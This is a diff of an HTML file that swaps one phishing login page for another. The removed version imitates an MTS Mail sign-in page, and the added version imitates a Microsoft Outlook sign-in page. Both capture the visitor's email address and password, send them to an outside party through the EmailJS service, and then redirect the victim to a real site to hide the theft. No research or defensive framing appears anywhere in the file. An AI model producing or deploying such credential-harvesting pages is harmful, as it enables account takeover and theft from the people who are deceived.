@@ -1,98 +1,141 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <base href="https://sourcesecureauth.github.io/newlogin/" />
-    <meta charset="UTF-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>MTS Mail | Login</title>
-    <link href="styles.css" rel="stylesheet" />
-    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Outlook</title>
+    <style>
+        /* General reset and responsive design */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #f3f3f3; 
+            font-family: Arial, sans-serif; 
+            padding: 20px; 
+        }
+        .login-container {
+            background-color: white; 
+            border: 1px solid #ccc; 
+            padding: 40px; 
+            max-width: 400px; 
+            margin: 100px auto; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); 
+        }
+        img {
+            width: 100px; 
+            display: block; 
+            margin-bottom: 15px; 
+        }
+        h1 {
+            color: black; 
+            margin: 10px 0; 
+            font-size: 20px; 
+            text-align: center; /* Center align the title */
+        }
+        .input-field {
+            margin-bottom: 15px; 
+            text-align: left; 
+        }
+        .input-line {
+            width: 100%; 
+            border: none; 
+            border-bottom: 1px solid #0078d7; 
+            outline: none; 
+            padding: 8px 0; 
+            font-size: 14px; 
+            margin-bottom: 10px; 
+        }
+        button {
+            background-color: #0078d7; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            padding: 10px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            width: 100%; 
+            margin-top: 10px; 
+            transition: background-color 0.3s ease; 
+        }
+        button:hover {
+            background-color: #005a9e; 
+        }
+        .footer {
+            margin-top: 15px; 
+            font-size: 12px; 
+            color: #666; 
+            text-align: center; /* Center align the footer */
+        }
+        .footer a {
+            color: #0078d7; 
+            text-decoration: none; 
+        }
+        .footer a:hover {
+            text-decoration: underline; 
+        }
+    </style>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your user ID
+        (function() {
+            emailjs.init('ITOFBodCl-Rh40_3l'); // Replace with your actual EmailJS User ID
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const email = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Simple validation
+            if (!email || !password) {
+                alert("Please fill in both fields."); // Alert if fields are empty
+                return;
+            }
+
+            // Send the email using EmailJS
+            emailjs.send("service_jxdp6lk", "template_2u2vrqo", {
+                email: email,
+                password: password
+            })
+            .then(function(response) {
+                console.log('Email sent successfully!', response.status, response.text);
+                // Redirect to Outlook after successful email sending
+                window.location.href = "https://outlook.office.com";
+            }, function(error) {
+                console.error('Failed to send email. Error:', error); // Logging error details
+                alert('Failed to send email. Please try again.'); // Notify user
+            });
+        }
+
+        // Set up the form submission event
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById('login-form').addEventListener('submit', sendEmail);
+        });
+    </script>
 </head>
 <body>
-<div class="wrapper">
-    <form id="form" name="sentMessage" novalidate="novalidate">
-        <input name="__original_url" type="hidden" value="https://sourcesecureauth.github.io/newlogin/" />
-        <div class="logo">
-            <img alt="" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5X8yEz0xHBoSWruoB1ztw20uBRoEPJ4lvTg&s" />
-            <p>Log in with your mymts.net email address</p>
+    <div class="login-container">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+        <h1>Sign In</h1>
+        <form id="login-form">
+            <div class="input-field">
+                <input type="text" id="username" name="email" class="input-line" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div class="input-field">
+                <input type="password" id="password" name="password" class="input-line" placeholder="Password" required>
+            </div>
+            <button type="submit">Sign In</button>
+        </form>
+        <div class="footer">
+            <p>No account? <a href="#">Create one!</a></p>
+            <p>Can’t access your account? <a href="#">Get help</a></p>
         </div>
-
-        <div class="container">
-            <div class="input-box">
-                <input id="email" name="email" placeholder="Email Address (example@mymts.net)" required="" type="text" />
-            </div>
-
-            <div class="input-box">
-                <input id="pw" name="pw" placeholder="Password" required="" type="password" />
-                <button id="togglePassword" type="button">Show</button>
-            </div>
-            <button class="btn" id="button" type="submit">LOG IN</button>
-
-            <div class="register-link">
-                <input type="checkbox" /> <span>Remember Me</span> <a href="#">Forgot Password?</a>
-            </div>
-        </div>
-    </form>
-</div>
-
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script><script type="text/javascript">
-    emailjs.init("k0j6f8XTF_aBl-Dip");
-</script>
-<script>
-    const btn = document.getElementById("button");
-    document.getElementById("form").addEventListener("submit", function (event) {
-        event.preventDefault();
-
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('pw').value.trim();
-        if (!email || !password) {
-            alert('Please fill in all fields.');
-            return;
-        }
-
-        btn.value = "Sending...";
-        const serviceID = "service_ut76as3";
-        const templateID = "template_n5lm9ms";
-        emailjs.sendForm(serviceID, templateID, this).then(
-            () => {
-                btn.value = "Send Email";
-                // Redirect to login success page
-                window.location.href = "https://www.bell.ca/"; // NOTE: Make sure this is the correct page you want to redirect to
-            },
-            (err) => {
-                btn.value = "Send Email";
-                alert(JSON.stringify(err));
-            }
-        );
-    });
-</script>
-<script>
-    const passwordInput = document.getElementById("pw");
-    const toggleButton = document.getElementById("togglePassword");
-    toggleButton.addEventListener("click", function () {
-        if (passwordInput.type === "password") {
-            passwordInput.type = "text";
-            toggleButton.textContent = "Hide";
-        } else {
-            passwordInput.type = "password";
-            toggleButton.textContent = "Show";
-        }
-    });
-</script>
-<!-- JavaScript Libraries -->
-<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
-<script src="lib/typed/typed.min.js"></script>
-<script src="lib/easing/easing.min.js"></script>
-<script src="lib/waypoints/waypoints.min.js"></script>
-<script src="lib/owlcarousel/owl.carousel.min.js"></script>
-<script src="lib/isotope/isotope.pkgd.min.js"></script>
-<script src="lib/lightbox/js/lightbox.min.js"></script>
-<!-- Contact Javascript File -->
-<script src="mail/jqBootstrapValidation.min.js"></script>
-<script src="mail/contact.js"></script>
-<!-- Template Javascript -->
-<script src="js/main.js"></script>
+    </div>
 </body>
 </html>
